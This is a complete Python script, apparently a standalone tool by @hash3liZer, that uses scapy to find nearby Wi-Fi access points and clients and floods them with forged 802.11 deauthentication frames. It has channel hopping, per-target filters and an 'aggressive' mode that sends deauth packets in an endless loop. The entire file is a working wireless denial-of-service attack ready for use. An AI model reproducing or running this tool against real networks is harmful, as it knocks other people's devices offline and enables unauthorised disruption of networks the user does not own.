#!/usr/bin/python
#Author: @hash3liZer

import sys
import argparse
import threading
import os
import time
import signal
import random
import subprocess
import re
from pull import PULL
from scapy.sendrecv import sniff
from scapy.sendrecv import sendp
from scapy.sendrecv import send
from scapy.layers.dot11 import Dot11Beacon
from scapy.layers.dot11 import Dot11
from scapy.layers.dot11 import Dot11Elt
from scapy.layers.dot11 import RadioTap
from scapy.layers.dot11 import Dot11Deauth
from scapy.layers.dot11 import Dot11FCS
from scapy.layers.eap   import EAPOL

class JAMMER:

	__ACCESSPOINTS = []
	__EXECUTED     = []
	__DECPACKETS   = []

	__BROADCAST    = "ff:ff:ff:ff:ff:ff"

	def __init__(self, prs):
		self.aggressive = prs.aggressive
		self.verbose    = prs.verbose
		self.exceptions = prs.exceptions

		self.interface  = prs.interface

		self.channel    = prs.channel
		self.essids     = prs.essids
		self.aps        = prs.aps
		self.stations   = prs.stations
		self.filters    = prs.filters

		self.packets    = prs.packets
		self.delay      = prs.delay
		self.reset      = prs.reset
		self.code       = prs.code

	def extract_essid(self, layers):
		retval = ''
		counter = 0

		try:
			while True:
				layer = layers[counter]
				if hasattr(layer, "ID") and layer.ID == 0:
					retval = layer.info.decode('utf-8')
					break
				else:
					counter += 1
		except IndexError:
			pass

		return retval
		
	def extract_channel(self, layers):
		retval = ''
		counter = 0

		try:
			while True:
				layer = layers[counter]
				if hasattr(layer, "ID") and layer.ID == 3 and layer.len == 1:
					retval = ord(layer.info)
					break
				else:
					counter += 1
		except IndexError:
			pass

		return retval

	def get_ess(self, bss):
		retval = ''

		for ap in self.__ACCESSPOINTS:
			if ap.get('bssid') == bss:
				retval = ap.get('essid')
				break

		return retval

	def get_channel(self, bss):
		retval = 0

		for ap in self.__ACCESSPOINTS:
			if ap.get('bssid') == bss:
				retval = ap.get('channel')

		return retval

	def filter_devices(self, sn, rc):
		retval = {
			'ap': '',
			'sta': '',
		}

		for ap in self.__ACCESSPOINTS:
			if ap.get('bssid') == sn:
				retval['ap'] = sn
				retval['sta'] = rc
			elif ap.get('bssid') == rc:
				retval['ap'] = rc
				retval['sta'] = sn

		return retval	

	def aggressive_run(self, ap, sta):
		pkt = self.forge(ap, sta)[0]

		self.write(ap, sta)

		while True:
			sendp(
				pkt,
				iface=self.interface,
				count=1,
				inter=0,
				verbose=False
			)	

	def aggressive_handler(self, ap, sta):		
		if (sta not in self.exceptions) and (self.aggressive) and (len(self.channel) == 1):
			t = threading.Thread(target=self.aggressive_run, args=(ap, sta))
			t.daemon = True
			t.start()


	def clarify(self, toappend):
		essid = toappend.get('essid')
		bssid = toappend.get('bssid')

		if self.essids:
			if essid in self.essids:
				if self.aps:
					if bssid in self.aps:
						self.__ACCESSPOINTS.append( toappend )
						self.aggressive_handler(bssid, self.__BROADCAST)
				else:
					self.__ACCESSPOINTS.append( toappend )
					self.aggressive_handler(bssid, self.__BROADCAST)
		else:
			if self.aps:
				if bssid in self.aps:
					self.__ACCESSPOINTS.append( toappend )
					self.aggressive_handler(bssid, self.__BROADCAST)
			else:
				self.__ACCESSPOINTS.append( toappend )
				self.aggressive_handler(bssid, self.__BROADCAST)

	def invalid(self, sta):
		for exception in self.exceptions:
			if sta.startswith(exception):
				return True

		return False

	def is_valid_sta(self, sta):
		if self.stations:
			if sta in self.stations:
				return True
			else:
				return False
		else:
			return True

	def get_crate(self, ch):
		retval = []

		for connection in self.__DECPACKETS:
			channel = connection.get('channel')

			if channel == ch:
				retval.append(connection)

		return retval

	def forge(self, ap, sta):
		def fpkt(sn, rc):
			pkt = RadioTap() / Dot11(
				type=0, 
				subtype=12,
				addr1=rc, 
				addr2=sn, 
				addr3=sn
				) / Dot11Deauth(
				reason=self.code
				)
			return pkt

		retval = []

		if sta != self.__BROADCAST:
			retval.append(fpkt(ap, sta))
			retval.append(fpkt(sta, ap))
		else:
			retval.append(fpkt(ap, sta))

		return retval

	def filtertify(self, ap, sta):
		if self.invalid(sta):
			return
		else:
			if ap not in self.filters and sta not in self.filters:
				if self.is_valid_sta(sta):
					onrun_form = (ap, sta)
					if onrun_form not in self.__EXECUTED:

						self.__EXECUTED.append(onrun_form)
						pkt_form = {
							'ap': ap,
							'sta': sta,
							'channel': self.get_channel(ap),
						}

						self.__DECPACKETS.append(pkt_form)

	def injector(self, pkt):
		if pkt.haslayer(Dot11Beacon):
			try:
				bssid = pkt.getlayer(Dot11FCS).addr2
			except:
				bssid = pkt.getlayer(Dot11).addr2

			essid = self.extract_essid(pkt.getlayer(Dot11Elt))
			channel = self.extract_channel(pkt.getlayer(Dot11Elt))

			toappend = {
				'essid': essid,
				'bssid': bssid,
				'channel': channel
			}

			if toappend not in self.__ACCESSPOINTS:
				self.clarify(
					toappend
				)

		else:
			sender = receiver = ""
			if pkt.haslayer(Dot11FCS) and pkt.getlayer(Dot11FCS).type == 2 and not pkt.haslayer(EAPOL):
				sender   = pkt.getlayer(Dot11FCS).addr2
				receiver = pkt.getlayer(Dot11FCS).addr1

			elif pkt.haslayer(Dot11) and pkt.getlayer(Dot11).type == 2 and not pkt.haslayer(EAPOL):
				sender   = pkt.getlayer(Dot11).addr2
				receiver = pkt.getlayer(Dot11).addr1

			if sender and receiver:
				result  = self.filter_devices(sender, receiver)

				if result.get('ap') and result.get('sta'):
					self.filtertify(result.get('ap'), result.get('sta'))

	def write(self, ap, sta):
		if self.verbose:
			pull.print("*",
				"Sent Deauths Count [{count}] Code [{code}] ({sdeveloper}) {sender} <--> ({rdeveloper}) {receiver} ({essid}) [{channel}]".format(
					count=pull.RED+str(self.packets)+pull.END,
					code =pull.GREEN+str(self.code)+pull.END,
					sender=pull.DARKCYAN+ap.upper()+pull.END,
					receiver=pull.DARKCYAN+sta.upper()+pull.END,
					sdeveloper=pull.PURPLE+pull.get_mac(ap)+pull.END,
					rdeveloper=pull.PURPLE+pull.get_mac(sta)+pull.END,
					essid=pull.YELLOW+self.get_ess(ap)+pull.END,
					channel=pull.RED+str(self.get_channel(ap))+pull.END
				),
				pull.YELLOW
			)
		else:
			pull.print("*",
				"Sent Deauths Count [{count}] Code [{code}] {sender} <--> {receiver} ({essid}) [{channel}]".format(
					count=pull.RED+str(self.packets)+pull.END,
					code =pull.GREEN+str(self.code)+pull.END,
					sender=pull.DARKCYAN+ap.upper()+pull.END,
					receiver=pull.DARKCYAN+sta.upper()+pull.END,
					essid=pull.YELLOW+self.get_ess(ap)+pull.END,
					channel=pull.RED+str(self.get_channel(ap))+pull.END
				),
				pull.YELLOW
			)

	def jammer(self):
		while True:
			ch = random.choice(self.channel)
			subprocess.call(['iwconfig', self.interface, 'channel', str(ch)])
			time.sleep(0.5)

			crate = self.get_crate(ch)

			for connection in crate:
				ap = connection.get( 'ap' )
				sta = connection.get( 'sta' )
				channel = connection.get( 'channel' )

				pkts = self.forge(ap, sta)
				for pkt in pkts:
					sendp(pkt, iface=self.interface, count=self.packets, inter=self.delay, verbose=False)

				self.write(ap, sta)

			self.resetter()

			time.sleep(0.5)

	def resetter(self):
		if self.reset:
			if len(self.__EXECUTED) >= self.reset:
				self.__EXECUTED = []
				self.__DECPACKETS = []

	def engage(self):
		t = threading.Thread(target=self.jammer)
		t.daemon = True
		t.start()

		sniff(iface=self.interface, prn=self.injector)

class PARSER:

	def __init__(self, opts):
		self.help        = self.help(opts.help)
		self.world       = opts.world
		self.aggressive  = opts.aggressive
		self.exceptions  = self.exceptions(opts.nbroadcast)
		self.verbose     = opts.verbose
		self.interface   = self.interface(opts.interface)

		self.channel     = self.channel(opts.channel)
		self.essids      = self.form_essids(opts.aps)
		self.aps         = self.form_macs(opts.aps)
		self.stations    = self.form_macs(opts.stations)
		self.filters     = self.form_macs(opts.filters)

		self.packets     = opts.packets if opts.packets > 0 else pull.halt("Number of packets Must Be >= 1", True, pull.RED)
		self.delay       = opts.delay   if opts.delay   >= 0 else pull.halt("Delay Interval Must be >= 0", True, pull.RED)
		self.reset       = opts.reset   if ((opts.reset == 0) or (opts.reset >= 5)) else pull.halt("Reset Must Be >= 5. ")
		self.code        = opts.code    if ((opts.code >= 1) and (opts.code <= 66)) else pull.halt("Code Must Be Greater Greater >= 1 and <= 66")

	def help(self, _help):
		if _help:
			pull.help()

	def exceptions(self, nbroadcast):
		retval = []
		if not nbroadcast:
			retval = ['00:00:00:00:00:00', '33:33:00:', '33:33:ff:', '01:80:c2:00:00:00', '01:00:5e:']
		else:
			retval = ['ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00', '33:33:00:', '33:33:ff:', '01:80:c2:00:00:00', '01:00:5e:']
		return retval

	def form_essids(self, essids):
		retval = []
		if essids:
			toloop = essids.split(",")
			for essid in toloop:
				if not re.search(r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$", essid):
					retval.append(essid)

		return retval

	def form_macs(self, bssids):
		retval = []
		if bssids:
			toloop = bssids.split(",")
			for bssid in toloop:
				if re.search(r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$", bssid):
					retval.append(bssid.lower())

		return retval

	def channel(self, ch):
		retval = list(range(1,15)) if self.world else list(range(1,12))
		if ch:
			if ch in retval:
				return [ch]
			else:
				pull.halt("Invalid Channel Given.", True, pull.RED)
		else:
			return retval

	def interface(self, iface):
		def getNICnames():
			ifaces = []
			dev = open('/proc/net/dev', 'r')
			data = dev.read()
			for n in re.findall('[a-zA-Z0-9]+:', data):
				ifaces.append(n.rstrip(":"))
			return ifaces

		def confirmMon(iface):
			co = subprocess.Popen(['iwconfig', iface], stdout=subprocess.PIPE)
			data = co.communicate()[0].decode()
			card = re.findall('Mode:[A-Za-z]+', data)[0]	
			if "Monitor" in card:
				return True
			else:
				return False

		if iface:
			ifaces = getNICnames()
			if iface in ifaces:
				if confirmMon(iface):
					return iface
				else:
					pull.halt("Interface Not In Monitor Mode [%s]" % (pull.RED + iface + pull.END), True, pull.RED)
			else:
				pull.halt("Interface Not Found. [%s]" % (pull.RED + iface + pull.END), True, pull.RED)
		else:
			pull.halt("Interface Not Provided. Specify an Interface!", True, pull.RED)

def main():
	parser = argparse.ArgumentParser(add_help=False)

	parser.add_argument('-h', '--help'        , dest="help"     , default=False, action="store_true")
	parser.add_argument('-i', '--interface'   , dest="interface", default="", type=str)

	parser.add_argument('-c', '--channel'     , dest="channel"  , default=0 , type=int)
	parser.add_argument('-a', '--accesspoints', dest="aps"   , default="", type=str)
	parser.add_argument('-s', '--stations'    , dest="stations", default="", type=str)
	parser.add_argument('-f', '--filters'     , dest="filters" , default="", type=str)

	parser.add_argument('-p', '--packets'     , dest="packets" , default=5 , type=int)
	parser.add_argument('-d', '--delay'       , dest="delay"   , default=0.1, type=int)
	parser.add_argument('-r', '--reset'       , dest="reset"   , default=0  , type=int)
	parser.add_argument('--code'              , dest="code"    , default=7  , type=int)

	parser.add_argument('--world'             , dest="world"     , default=False, action="store_true")
	parser.add_argument('--aggressive'        , dest="aggressive", default=False, action="store_true")
	parser.add_argument('--no-broadcast'      , dest="nbroadcast", default=False, action="store_true")
	parser.add_argument('--verbose'           , dest="verbose"   , default=False, action="store_true")

	options = parser.parse_args()
	parser = PARSER(options)

	pull.print(
		"*",
		"IFACE [{interface}] CHANNEL [{channel}] VERBOSE [{verbose}]".format(
			interface=pull.DARKCYAN+parser.interface+pull.END,
			channel=pull.DARKCYAN+str(("HOP" if len(parser.channel) > 1 else parser.channel[0]))+pull.END,
			verbose=pull.DARKCYAN+("True" if parser.verbose else "False")+pull.END
		),
		pull.DARKCYAN,
	)

	pull.print(
		"*",
		"APS [{aps}] STATIONS [{stations}] FILTERS [{filters}]".format(
			aps=pull.DARKCYAN+str(len(parser.aps))+pull.END,
			stations=pull.DARKCYAN+str(len(parser.stations))+pull.END,
			filters=pull.DARKCYAN+str(len(parser.filters))+pull.END
		),
		pull.DARKCYAN
	)

	pull.print(
		"*",
		"PACKETS [{packets}] DELAY [{delay}] RST [{reset}] CD [{code}]".format(
			packets=pull.DARKCYAN+str(parser.packets)+pull.END,
			delay=pull.DARKCYAN+str(parser.delay)+pull.END,
			reset=pull.DARKCYAN+str(parser.reset)+pull.END,
			code=pull.DARKCYAN+str(parser.code)+pull.END
		),
		pull.DARKCYAN
	)

	pull.print(
		"^",
		"Engaing With Jammer Now",
		pull.GREEN
	)

	jammer = JAMMER(parser)
	jammer.engage()

if __name__ == "__main__":
	pull = PULL()
	main()